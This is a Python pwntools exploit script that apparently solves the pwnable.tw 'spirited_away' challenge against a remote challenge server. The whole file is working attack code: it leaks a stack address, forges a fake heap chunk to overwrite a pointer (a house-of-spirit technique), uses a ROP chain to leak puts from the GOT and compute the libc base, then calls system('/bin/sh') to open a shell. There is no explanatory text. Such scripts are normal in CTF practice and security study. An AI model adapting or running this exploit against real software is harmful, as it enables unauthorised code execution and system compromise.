from pwn import *
debug = 0
if debug:
	s = process('./spirited_away')
	system_offset = 0x3ada0
	binsh_offset = 0x15ba0b
	puts_offset = 0x5fca0
	raw_input('debug')
else:
	# context.log_level='debug'
	s = remote('chall.pwnable.tw', 10204)
	e = ELF('libc_32.so.6')
	system_offset = e.symbols['system']
	binsh_offset = e.search('/bin/sh').next()
	puts_offset = e.symbols['puts']

s.sendlineafter('Please enter your name: ','tuan')
s.sendlineafter('Please enter your age: ','20')
s.sendlineafter('Why did you came to see this movie? ','a'*78+'d')
s.sendlineafter('Please enter your comment: ','b')
s.recvuntil('Reason: ')
s.recvuntil('d\n')
ebp = u32(s.recv(4))
log.info('ebp: 0x%x'%ebp)
# log.info('main+51: 0x%x'%(u32(s.recv(4))))
# log.info('leak 3: 0x%x'%(u32(s.recv(4))))
# log.info('leak 4: 0x%x'%(u32(s.recv(4))))
s.sendlineafter('Would you like to leave another comment? <y/n>: ','y')
nbufadd = ebp - 0xd0
comment = ebp - 0xc8
fakechunk = ebp-0x70

for i in range(9):
	s.sendlineafter('Please enter your name: ','tuan')
	s.sendlineafter('Please enter your age: ','20')
	s.sendlineafter('Why did you came to see this movie? ','a')
	s.sendlineafter('Please enter your comment: ','b')
	s.sendlineafter('Would you like to leave another comment? <y/n>: ','y')

for i in range(10,100):
	# s.sendlineafter('Please enter your name: ','tuan')
	s.sendlineafter('Please enter your age: ','20')
	s.sendlineafter('Why did you came to see this movie? ','a')
	# s.sendlineafter('Please enter your comment: ','b')
	s.sendlineafter('Would you like to leave another comment? <y/n>: ','y')

offset2buf = 0x54
s.sendlineafter('Please enter your name: ','tuan')
s.sendlineafter('Please enter your age: ','20')

# create fake chunk
payload = p32(0x0) + p32(0x41) + p32(0)*15 + p32(0x21) #+ p32(0)*7+p32(0x41) 
s.sendlineafter('Why did you came to see this movie? ',payload)

#overwite the old pointer to heap chunk 
payload2 = 'a'*0x54+ p32(fakechunk+8)
s.sendlineafter('comment: ',payload2)
s.sendlineafter('Would you like to leave another comment? <y/n>: ','y')

# overwite ebp: offset = 0x48
#0x68 : leak libc and back 2 main
puts_plt = 0x80484a0
puts_got = 0x804a020
main = 0x80488d5
payload3 = 'a'*(0x48+4)+ p32(puts_plt) + p32(main)+ p32(puts_got)
s.sendafter('Please enter your name: ',payload3)
s.sendlineafter('Please enter your age: ','20')
s.sendlineafter('Why did you came to see this movie? ','a')
s.sendlineafter('Please enter your comment: ','b')
s.sendlineafter('Would you like to leave another comment? <y/n>: ','n')
s.recvuntil('Bye!\n')
# s.recvuntil('+')
puts_libc = u32(s.recv(4))
log.info("puts_libc: 0x%x"%puts_libc)

libc_base = puts_libc - puts_offset
system = system_offset + libc_base
binsh = binsh_offset + libc_base
log.info("libc_base: 0x%x"%libc_base)
log.info("system: 0x%x"%system)
log.info("binsh: 0x%x"%binsh)

s.sendlineafter('Please enter your name: ','tuan')
s.sendlineafter('Please enter your age: ','20')
s.sendlineafter('Why did you came to see this movie? ','a'*78+'d')
s.sendlineafter('Please enter your comment: ','b')
s.recvuntil('Reason: ')
s.recvuntil('d\n')
ebp = u32(s.recv(4))
log.info('ebp: 0x%x'%ebp)
log.info('main+51: 0x%x'%(u32(s.recv(4))))

s.sendlineafter('Would you like to leave another comment? <y/n>: ','y')
nbufadd = ebp - 0xd0
comment = ebp - 0xc8
fakechunk = ebp-0x70

# for i in range(9):
	# s.sendlineafter('Please enter your name: ','tuan')
	# s.sendlineafter('Please enter your age: ','20')
	# s.sendlineafter('Why did you came to see this movie? ','a')
	# s.sendlineafter('Please enter your comment: ','b')
	# s.sendlineafter('Would you like to leave another comment? <y/n>: ','y')

# for i in range(10,100):
	# s.sendlineafter('Please enter your name: ','tuan')
	# s.sendlineafter('Please enter your age: ','20')
	# s.sendlineafter('Why did you came to see this movie? ','a')
	# s.sendlineafter('Please enter your comment: ','b')
	# s.sendlineafter('Would you like to leave another comment? <y/n>: ','y')

offset2buf = 0x54
s.sendlineafter('Please enter your name: ','tuan')
s.sendlineafter('Please enter your age: ','20')

# create fake chunk
payload = p32(0x0) + p32(0x41) + p32(0)*15 + p32(0x21) #+ p32(0)*7+p32(0x41) 
s.sendlineafter('Why did you came to see this movie? ',payload)

#overwite the old pointer to heap chunk 
payload2 = 'a'*0x54+ p32(fakechunk+8+8)
s.sendlineafter('comment: ',payload2)
s.sendlineafter('Would you like to leave another comment? <y/n>: ','y')

# overwite ebp: offset = 0x48
#0x68 : leak libc and back 2 main
payload3 = 'a'*(0x48+4)+ p32(system) + p32(main)+ p32(binsh)
s.sendafter('Please enter your name: ',payload3)
s.sendlineafter('Please enter your age: ','20')
s.sendlineafter('Why did you came to see this movie? ','a')
s.sendlineafter('Please enter your comment: ','b')
s.sendlineafter('Would you like to leave another comment? <y/n>: ','n')

s.interactive()
s.close()
